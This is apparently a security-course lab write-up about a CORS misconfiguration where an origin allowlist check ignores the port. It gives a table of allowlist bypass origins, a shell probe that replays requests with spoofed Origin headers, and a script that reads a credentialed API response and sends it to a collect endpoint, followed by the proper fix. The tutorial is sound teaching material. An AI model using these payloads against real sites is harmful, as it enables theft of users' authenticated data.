# Lab 23 — Partner API

## First, what CORS is not

`Access-Control-Allow-Origin` does not protect the server. The request reaches
the server either way; CORS decides whether the *browser* lets the calling page
**read the response**. So a CORS misconfiguration is a read primitive for
attacker pages, and it is only interesting when the response contains something
worth reading and the request carries credentials.

Which gives the two-part test:

1. Does the server reflect an origin I control into `Access-Control-Allow-Origin`?
2. Does it also send `Access-Control-Allow-Credentials: true`?

Both, or it does not matter.

## The bug

```python
ALLOWED_PREFIX = "http://127.0.0.1"        # meant to say "our own front end"
if origin.startswith(ALLOWED_PREFIX):
```

An origin is **scheme + host + port**. This check stops reading before the port,
so every other port on the machine is inside the allowlist — and one of them is
the attacker's page.

The same family, all real:

| Written as | Bypassed by |
| --- | --- |
| `origin.startswith("https://acme.test")` | `https://acme.test.evil.example` |
| `origin.endswith("acme.test")` | `https://evilacme.test` |
| `"acme.test" in origin` | `https://evil.example/?x=acme.test` (in a Referer check) |
| `re.match("https://.*\\.acme\\.test", o)` | unanchored: `https://x.acme.test.evil.example` |
| a check that forgets the port | this lab |
| `Origin: null` allowed | a sandboxed iframe or `data:` URL sends `null` |
| reflect whatever arrives | anything at all — the most common of the lot |

## Finding it without a browser

One replay per candidate origin, reading only the response header:

```bash
h5i browser open http://127.0.0.1:9230/ --session lab23 --new --capture
for O in http://evil.example http://127.0.0.1:9231 null; do
  printf '%-24s ' "$O"
  h5i websec replay req_0 --session lab23 --create \
      --set path=/api/me --set "header.Origin=$O" |
    python3 -c 'import json,sys
h=dict((k.lower(),v) for k,v in json.load(sys.stdin)["response"]["headers"])
print(h.get("access-control-allow-origin","-"), h.get("access-control-allow-credentials","-"))'
done
```

```
http://evil.example      - -
http://127.0.0.1:9231    http://127.0.0.1:9231 true      ← the finding
null                     - -
```

This is the whole finding. The browser step below is the proof of impact.

## Proving impact

```html
<script>
fetch('http://127.0.0.1:9230/api/me', {credentials: 'include'})
  .then(r => r.text())
  .then(t => fetch('http://127.0.0.1:9230/collect?id=drop1&c=' + encodeURIComponent(t)))
</script>
```

`credentials: 'include'` is the load-bearing option: without it the browser
sends no cookie and the response has nothing in it. Note that the *exfiltration*
fetch is itself cross-origin and its response is unreadable — which does not
matter, because the request carried the data and that is all you needed.

## Why h5i is a good witness here

h5i implements the same-origin policy faithfully, and says so when it blocks:

```
ERROR GET http://…/collect — blocked by the same-origin policy: the response has
no `Access-Control-Allow-Origin` header, so http://127.0.0.1:9231 may not read it.
```

That means a negative result in this lab is real: if you fix the check to `==`
and rerun, the exploit stops working. A "victim" that ignores CORS would have
proved nothing.

## The fix

```python
ALLOWED = {"https://app.acme.test", "https://admin.acme.test"}
if origin in ALLOWED:          # exact, whole-string, set membership
    ...
```

Exact matching against a set. Never build the allowlist with `startswith`,
`endswith`, `in`, or an unanchored regex. Never reflect an arbitrary origin
with credentials — `Access-Control-Allow-Origin: *` is explicitly forbidden
alongside credentials, and reflecting is the same thing with the prohibition
removed. Add `Vary: Origin` so a cache cannot serve one origin's answer to
another (which is Lab 33's territory). And if the data does not need to be
cross-origin readable, send no CORS headers at all.

## h5i technique

Reading a named response header out of the `replay` reply's
`response.headers` — a two-line probe that answers a whole vulnerability class.
